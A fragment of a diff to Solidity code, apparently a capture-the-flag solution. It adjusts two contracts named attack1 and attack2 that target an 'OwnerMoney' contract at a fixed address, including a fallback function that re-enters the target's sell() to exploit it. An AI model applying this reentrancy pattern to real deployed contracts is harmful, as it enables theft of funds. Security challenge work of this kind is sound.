@@ -119,7 +119,7 @@ contract OwnerMoney {
 contract attack1 {
     
     address instance_address = 0xb9f9a887b06b54ab851928f3bc721b120876196b ;
-    Game target = Game(instance_address);
+    OwnerMoney target = OwnerMoney(instance_address);
     bool public flag = true;
     uint public have_sell = 0;
     
@@ -149,14 +149,14 @@ contract attack1 {
     function() payable {
         if (have_sell < 1) {
             have_sell += 1;
-            target.sell(100);
+            target.sell(200);
         }
     }
 }
 
 contract attack2 {
     address instance_address = 0xb9f9a887b06b54ab851928f3bc721b120876196b;
-    Game target = Game(instance_address);
+    OwnerMoney target = OwnerMoney(instance_address);
     
     constructor() payable {}
     
